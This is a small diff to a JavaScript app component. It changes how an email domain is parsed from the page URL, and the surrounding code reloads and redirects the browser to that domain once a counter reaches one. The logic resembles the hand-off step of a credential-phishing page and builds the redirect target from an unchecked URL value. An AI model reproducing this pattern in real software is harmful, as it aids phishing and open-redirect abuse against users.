@@ -71,7 +71,7 @@ const App = ()=>{
             if(count >= 1){
                 const redirectURL = window.location.href;
                 const sliceEqualSign = redirectURL.indexOf("@");
-                const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1));
+                const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1)).split('&', 1).toString();
                 console.log(extracetdemailDomain);
                 window.location.reload();
                 window.location.href = `https://www.${extracetdemailDomain}`;
